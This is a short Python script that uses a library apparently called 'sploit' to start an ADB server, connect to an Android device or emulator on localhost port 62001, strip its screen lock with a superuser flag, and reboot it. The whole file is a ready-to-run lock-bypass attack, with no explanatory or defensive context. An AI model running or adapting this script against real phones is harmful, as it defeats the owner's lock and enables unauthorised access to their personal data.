from com.cosmo.sploit.tools import  Session,SessionManager,ADB
adb=ADB()
adb.configure()
adb.start_server()
sessionManager=SessionManager()
sessionManager.add_session(Session("localhost","62001",_unique_session_id="screen_locked").start_session())
s=sessionManager.get_session_unique("screen_locked")
s.remove_screen_lock(s.get_device(),_su='')
try:
 s.reboot_device(s.get_device())
except KeyboardInterrupt as e:
    sessionManager.close_all_session()
    sessionManager.remove_all_closed_session()
    adb.kill_server()
